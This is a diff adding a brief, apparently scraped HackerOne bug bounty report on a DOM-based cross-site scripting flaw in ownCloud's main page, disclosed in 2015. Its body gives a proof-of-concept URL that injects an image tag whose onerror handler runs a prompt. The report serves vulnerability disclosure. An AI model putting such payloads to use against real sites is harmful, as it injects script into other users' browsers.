@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/83178
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/hammadshamsi
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:11.10.2015 7:06:49
+
+Summary:
+
+Hello,
+
+there's DOM Based XSS In Main Page
+
+https://owncloud.com/#"><img src="z" onerror="prompt(2);">//
+
+Thanks
